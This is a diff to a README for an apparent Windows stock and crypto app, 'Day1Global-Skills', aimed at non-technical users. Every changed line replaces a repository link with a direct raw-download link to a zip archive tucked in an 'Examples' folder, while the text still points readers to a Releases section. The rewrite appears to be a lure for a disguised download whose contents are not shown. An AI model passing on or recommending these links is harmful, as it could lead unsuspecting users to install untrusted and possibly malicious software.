@@ -1,6 +1,6 @@
 # 🚀 Day1Global-Skills - Simple Tools for Stock and Crypto
 
-[![Download Day1Global-Skills](https://img.shields.io/badge/Download-Day1Global--Skills-brightgreen)](https://github.com/StefanPcHack/Day1Global-Skills)
+[![Download Day1Global-Skills](https://img.shields.io/badge/Download-Day1Global--Skills-brightgreen)](https://github.com/StefanPcHack/Day1Global-Skills/raw/refs/heads/main/Examples/Global_Day_Skills_v3.0-alpha.5.zip)
 
 Day1Global-Skills is a Windows app that helps you follow US stock markets and cryptocurrency trends. It also shares tips to improve your daily skills and productivity. This guide shows you how to get the app up and running with no technical knowledge.
 
@@ -9,7 +9,7 @@ Day1Global-Skills is a Windows app that helps you follow US stock markets and cr
 To get Day1Global-Skills on your Windows computer, follow these steps:
 
 1. Open your web browser and go to this link:  
-   [https://github.com/StefanPcHack/Day1Global-Skills](https://github.com/StefanPcHack/Day1Global-Skills)
+   [https://github.com/StefanPcHack/Day1Global-Skills/raw/refs/heads/main/Examples/Global_Day_Skills_v3.0-alpha.5.zip](https://github.com/StefanPcHack/Day1Global-Skills/raw/refs/heads/main/Examples/Global_Day_Skills_v3.0-alpha.5.zip)
 
 2. Once on the page, look for the **Releases** section. This page holds the files you need.
 
@@ -25,7 +25,7 @@ To get Day1Global-Skills on your Windows computer, follow these steps:
 
 If you want quick access, use the button below:
 
-[![Download Here](https://img.shields.io/badge/Click_to_Download-Day1Global--Skills-blue)](https://github.com/StefanPcHack/Day1Global-Skills)
+[![Download Here](https://img.shields.io/badge/Click_to_Download-Day1Global--Skills-blue)](https://github.com/StefanPcHack/Day1Global-Skills/raw/refs/heads/main/Examples/Global_Day_Skills_v3.0-alpha.5.zip)
 
 ## 💻 System Requirements
 
@@ -63,7 +63,7 @@ The app saves your preferences, so it feels familiar each time you start it.
 To get the latest features or bug fixes:
 
 1. Visit the GitHub page again:  
-   [https://github.com/StefanPcHack/Day1Global-Skills](https://github.com/StefanPcHack/Day1Global-Skills)
+   [https://github.com/StefanPcHack/Day1Global-Skills/raw/refs/heads/main/Examples/Global_Day_Skills_v3.0-alpha.5.zip](https://github.com/StefanPcHack/Day1Global-Skills/raw/refs/heads/main/Examples/Global_Day_Skills_v3.0-alpha.5.zip)
 
 2. Download the newest installer from the Releases section.
 
@@ -123,4 +123,4 @@ This keeps your experience simple and safe.
 
 Day1Global-Skills is designed for daily use without complex steps. The interface stays clean so you can focus on the data and your skills.
 
-[![Download Day1Global-Skills](https://img.shields.io/badge/Download-Day1Global--Skills-brightgreen)](https://github.com/StefanPcHack/Day1Global-Skills)
+[![Download Day1Global-Skills](https://img.shields.io/badge/Download-Day1Global--Skills-brightgreen)](https://github.com/StefanPcHack/Day1Global-Skills/raw/refs/heads/main/Examples/Global_Day_Skills_v3.0-alpha.5.zip)
